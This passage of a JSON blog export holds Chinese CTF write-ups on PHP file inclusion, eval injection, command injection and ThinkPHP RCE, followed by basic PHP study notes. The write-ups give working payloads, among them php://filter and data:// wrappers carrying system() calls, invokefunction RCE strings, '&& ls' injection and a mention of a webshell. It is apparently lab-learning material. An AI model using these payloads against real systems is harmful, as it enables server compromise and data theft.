href=\"#文件包含漏洞\" class=\"headerlink\" title=\"文件包含漏洞\"></a>文件包含漏洞</h1><p>刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解<a href=\"https://blog.csdn.net/qq_37133717/article/details/94631028\">https://blog.csdn.net/qq_37133717/article/details/94631028</a>    </p>\n<h2 id=\"bugku-6-文件包含-本地包含\"><a href=\"#bugku-6-文件包含-本地包含\" class=\"headerlink\" title=\"bugku-6.文件包含-本地包含\"></a>bugku-6.文件包含-本地包含</h2><p>CSDN大佬讲解：<a href=\"https://blog.csdn.net/qq_39431542/article/details/88628225\">本地文件包含漏洞详解</a><br>第二行可知，flag在flag.php里，倒数第二行show_source(<strong>FILE</strong>)很明显的提示<br>$_REQUEST[]支持get、post两种方式发送过来的请求，很明显接收了hello参数的值，<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与值；数组将递归展开值，通过缩进显示其结构<br>eval()函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>show_source() 函数对文件进行语法显示,是 highlight_file() 的别名</p>\n<blockquote>\n<p>本题代码如下<br><img src=\"images/bugku6.1.png\" alt=\"6.1\">   </p>\n<ul>\n<li>可直接将flag.php文件读入变量hello中<br>url输入?hello=file(‘flag.php’)<br><img src=\"images/bugku6.2.png\" alt=\"6.2\">     </li>\n<li>eval存在命令执行漏洞，使用hello构造payload<br><code>index.php?hello=1);show_source(%27flag.php%27);var_dump(3</code><br><img src=\"images/bugku6.3.png\" alt=\"6.3\">    </li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"bugku-12-文件包含漏洞\"><a href=\"#bugku-12-文件包含漏洞\" class=\"headerlink\" title=\"bugku-12.文件包含漏洞\"></a>bugku-12.文件包含漏洞</h2><blockquote>\n<p><img src=\"images/bugku12.0.png\" alt=\"12.0\"><br>点<br><img src=\"images/bugku12.1.png\" alt=\"12.1\"><br>观察url : “<a href=\"http://114.67.246.176:16465/index.php?file=show.php&quot;%EF%BC%8C%E7%9C%8B%E5%88%B0file%EF%BC%8C%E6%98%8E%E7%99%BD%E8%BF%99%E5%8F%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8C%E8%81%94%E6%83%B3%E5%88%B0\">http://114.67.246.176:16465/index.php?file=show.php&quot;，看到file，明白这又是文件包含的题目，联想到</a><u>读取index文件，但是直接读取index无法查看，所以就应该考虑用base64方法读取，构造url</u>.<br>构造url=“<a href=\"http://your/\">http://your</a> test ip/index.php?file=php://filter/read=convert.base64-encode/resource=index.php” , 网页返回base64.解码得flag<br><img src=\"images/bugku12.2.png\" alt=\"12.2\"> </p>\n<ul>\n<li>php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。  </li>\n</ul>\n</blockquote>\n<hr>\n<h2 id=\"攻防世界-Web-php-include\"><a href=\"#攻防世界-Web-php-include\" class=\"headerlink\" title=\"攻防世界-Web_php_include\"></a>攻防世界-Web_php_include</h2><p><img src=\"images/gf3.0.png\" alt=\"3.0\"><br>从代码中得知page中带有php://的都会被替换成空<br>    str_replace()以其他字符替换字符串中的一些字符(区分大小写)<br>    strstr() 查找字符串首次出现的位置。返回字符串剩余部分    </p>\n<blockquote>\n<p>方法一<br>1.可以利用PHP的大小写转换，利用PHP://input         </p>\n</blockquote>\n<ul>\n<li>php://filter<br>#执行文件<br>page=Php://filter/resource=index.php<br>#读取文件需要将文件名base64编码   page=Php://filter/read=convert.base64-encode/resource=index.php</li>\n<li>php://input<br>这个协议的利用方法是 将要执行的php代码写在post中提交，不用键与值的形式，只写代码即可。 <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class=\"line\">&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;   </span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>用burpsuite在报文中加一句话木马<br><img src=\"images/gf3.1.png\" alt=\"3.1\"><br><img src=\"images/gf3.2.png\" alt=\"3.2\">    </p>\n</blockquote>\n</li>\n</ul>\n<hr>\n<blockquote>\n<p>方法二 data协议    </p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data: text&#x2F;plain,&lt;?php 执行内容 ?&gt;   </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;ls&quot;);?&gt;      </span><br><span class=\"line\">?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt;  </span><br></pre></td></tr></table></figure>\n<p> 查看源代码，发现flag     </p>\n<blockquote>\n<p>方法三 http://协议进行绕过<br>利用hello参数将执行内容显示，flag如图所示</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?page&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php&#x2F;?hello&#x3D;&lt;? system(&quot;ls&quot;);?&gt;      </span><br></pre></td></tr></table></figure>\n<p><img src=\"images/gf3.3.png\" alt=\"3.3\">   </p>\n<pre><code>?page=http://127.0.0.1/index.php/?hello=&lt;? show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;    </code></pre>\n<p><img src=\"images/gf3.4.png\" alt=\"3.4\"></p>\n","text":"文件包含漏洞刚起步，遇到两个 文件包含 的题目<br>先附上CSDN看到的关于文件包含的讲解https://blog.csdn.net/qq_37133717/article/details/94631028    bugku-6.文件包含-本地包含CSDN大佬讲解：本地文件包含","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"bugku刷到","slug":"bugku刷到","count":1,"path":"api/tags/bugku刷到.json"}]},{"title":"web攻防世界","slug":"web攻防世界","date":"2021-01-13T09:11:31.000Z","updated":"2021-02-04T07:41:12.272Z","comments":true,"path":"api/articles/web攻防世界.json","excerpt":"","keywords":null,"cover":"images/gf1.0.png","content":"<h2 id=\"WAF\"><a href=\"#WAF\" class=\"headerlink\" title=\"WAF\"></a>WAF</h2><p>WAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。</p>\n<h2 id=\"1-Ping命令用法\"><a href=\"#1-Ping命令用法\" class=\"headerlink\" title=\"1.Ping命令用法\"></a>1.Ping命令用法</h2><p><a href=\"https://blog.csdn.net/qq646748739/article/details/81660514\">https://blog.csdn.net/qq646748739/article/details/81660514</a><br>这题没有上waf，也就是可以篡改网站。<br><img src=\"images/gf1.0.png\" alt=\"1.0\"><br><img src=\"images/gf1.1.png\" alt=\"1.1\"><br>发现可以ping通。ping本地<br><img src=\"images/gf1.2.png\" alt=\"1.2\"><br>搜txt文本，查找flag<br><img src=\"images/gf1.3.png\" alt=\"1.3\"><br>找到flag       </p>\n<hr>\n<h2 id=\"2-php-rce（Ping）\"><a href=\"#2-php-rce（Ping）\" class=\"headerlink\" title=\"2.php_rce（Ping）\"></a>2.php_rce（Ping）</h2><p><img src=\"images/gf2.0.png\" alt=\"2.0\">        </p>\n<blockquote>\n<p>RCE英文全称：remote command/code execute 分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>两个基本命令执行：     </p>\n</blockquote>\n<ul>\n<li>?s=index/think\\app/invokefunction&amp;   function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br><u>执行phpinfo()函数：</u>  </li>\n<li>?s=index/\\think\\app/invokefunction&amp;    function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br><img src=\"images/gf2.1.png\" alt=\"2.1\"><br>得到相应的结果,这里就可以直接运行linux命令了<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<u >find / -name “flag”</u><br><img src=\"images/gf2.2.png\" alt=\"2.2\"><br>得到目录,直接查看<br>?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag /flag<br><img src=\"images/gf2.3.png\" alt=\"2.3\">  </li>\n</ul>\n<hr>\n<h2 id=\"simple-php\"><a href=\"#simple-php\" class=\"headerlink\" title=\"simple_php\"></a>simple_php</h2><p>php中有两种比较符号<br>=== 会同时比较字符串的值和类型<br>== 会先将字符串换成相同类型，再作比较，属于弱类型比较  </p>\n<hr>\n<h2 id=\"xff-referer\"><a href=\"#xff-referer\" class=\"headerlink\" title=\"xff_referer\"></a>xff_referer</h2><p>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项</p>\n<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的</p>\n<hr>\n<h2 id=\"command-execution\"><a href=\"#command-execution\" class=\"headerlink\" title=\"command_execution\"></a>command_execution</h2><p>2、掌握有关命令执行的知识<br>windows 或 linux 下:<br>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2<br>command1 | command2 只执行 command2<br>command1 &amp; command2 先执行 command2 后执行 command1<br>command1 || command2 先执行 command1，如果为假，再执行   command2<br>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）<br>127.0.0.1 &amp;&amp; ls能看到当前目录下的文件<br>127.0.0.1 &amp;&amp; ls ../到上一级目录  </p>\n<hr>\n<h2 id=\"php-rce\"><a href=\"#php-rce\" class=\"headerlink\" title=\"php_rce\"></a>php_rce</h2><p>php_rce,已经可以看出是 php 远程命令执行的缩写<br>直接看漏洞利用：<br><a href=\"http://localhost:9096/public/index.php?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;va\">http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;va</a><br>rs[0]=system&amp;vars[1][]=whoami<br>直接找flag<br>/index.php?s=index/think\\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%<br>22flag%22<br>查flag<br>/index.php?s=index/think\\app/invokefunction&amp;func<br>tion=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</p>\n<hr>\n<h2 id=\"easytornado\"><a href=\"#easytornado\" class=\"headerlink\" title=\"easytornado\"></a>easytornado</h2>","text":"WAFWAF主要防护的是来自对网站源站的动态数据攻击，可防护的攻击类型包括SQL注入、XSS攻击、CSRF攻击、恶意爬虫、扫描器、远程文件包含等攻击,相当于防火墙。1.Ping命令用法https://blog.csdn.net/qq646748739/article/detail","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"WEB","slug":"WEB","count":1,"path":"api/tags/WEB.json"}]},{"title":"PHP学习笔记","slug":"PHP学习笔记","date":"2021-01-12T06:48:37.000Z","updated":"2021-01-31T10:16:40.377Z","comments":true,"path":"api/articles/PHP学习笔记.json","excerpt":"","keywords":null,"cover":"images/php1.0.png","content":"<h2 id=\"下午搞一搞PHP\"><a href=\"#下午搞一搞PHP\" class=\"headerlink\" title=\"下午搞一搞PHP\"></a>下午搞一搞PHP</h2><hr>\n<h1 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h1><ul>\n<li><p>var_dump() 会返回变量的数据类型和值：</p>\n</li>\n<li><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。<u>所有变量都对大小写敏感</u>  </p>\n</li>\n<li><p>var_dump() 会返回变量的数据类型和值    </p>\n<h3 id=\"字符串函数\"><a href=\"#字符串函数\" class=\"headerlink\" title=\"字符串函数\"></a>字符串函数</h3></li>\n<li><p>str_word_count() 函数对字符串中的单词进行计数  </p>\n</li>\n<li><p>strrev() 函数反转字符串</p>\n</li>\n<li><p>strpos() 函数用于检索字符串内指定的字符或文本<br>如果找到匹配，则会返回首个匹配的<u>字符位置</u>。如果未找到匹配，则将返回 FALSE。下例检索字符串 “Hello world!” 中的文本 “world”：<br><img src=\"images/php1.0.png\" alt=\"php1.0\"></p>\n</li>\n<li><p>str_replace() 函数用一些字符串替换字符串中的另一些字符<br><img src=\"images/php1.2.png\" alt=\"php1.2\">   </p>\n<blockquote>\n<p>+strstr()、strchr()、strrchr()和stristr()：在字符串中查找字符串函数      </p>\n<blockquote>\n<p>函数strstr()有两个变体。第一个变体是stristr()，它几乎和strstr()一样，其区别在于不区分字符大小写<br>第二个变体是strrchr()， 函数查找==字符==（注意：这里是字符不是字符串）在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。<br><img src=\"images/php1.3.png\" alt=\"php1.3\">   </p>\n</blockquote>\n</blockquote>\n</li>\n<li><p>substr()截取字符串前N个字符或者从第几个字符开始取几个字符  </p>\n</li>\n</ul>\n<hr>\n<pre><code>&lt;?php    \n$str = &quot;123456789&quot;;   \necho substr($str , 0 , 3);//从左边第一位字符起截取3位字符：结果：123\necho substr($str , 3 , 3);//从左边第3位字符起截取3位字符：结果：456\n?&gt;   </code></pre>\n<hr>\n<pre><code>&lt;?php\n$rest = substr(&quot;abcdef&quot;, -1);    // 返回 &quot;f&quot;\n$rest = substr(&quot;abcdef&quot;, -2);    // 返回 &quot;ef&quot;\n$rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;\n?&gt;        </code></pre>\n<h2 id=\"2021-1-31\"><a href=\"#2021-1-31\" class=\"headerlink\" title=\"2021.1.31\"></a>2021.1.31</h2><h3 id=\"buu-warmup\"><a href=\"#buu-warmup\" class=\"headerlink\" title=\"buu - warmup\"></a>buu - warmup</h3><ul>\n<li>isset()： 判断变量是否声明；       </li>\n<li>is_string()： 判断变量是否是字符串；     </li>\n<li>in_array(search,array)： 判断array中是否存在search；     </li>\n<li>mb_substr()： 函数返回字符串的一部分    </li>\n<li>mb_strpos（haystack，needle）： 在 haystack 中查找needle第一次出现的位置 ；</li>\n</ul>\n","text":"下午搞一搞PHPphpvar_dump() 会返回变量的数据类型和值：在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。所有变量都对大小写敏感  var_dump() 会返回变量的数据类型和值    字符串函数str_word","link":"","raw":null,"photos":[],"categories":[{"name":"web security","slug":"web-security","count":1,"path":"api/categories/web-security.json"},{"name":"做一顶白帽子","slug":"web-security/做一顶白帽子","count":1,"path":"api/categories/web-security/做一顶白帽子.json"}],"tags":[{"name":"w3school","slug":"w3school","count":1,"path":"api/tags/w3school.json"}]}]}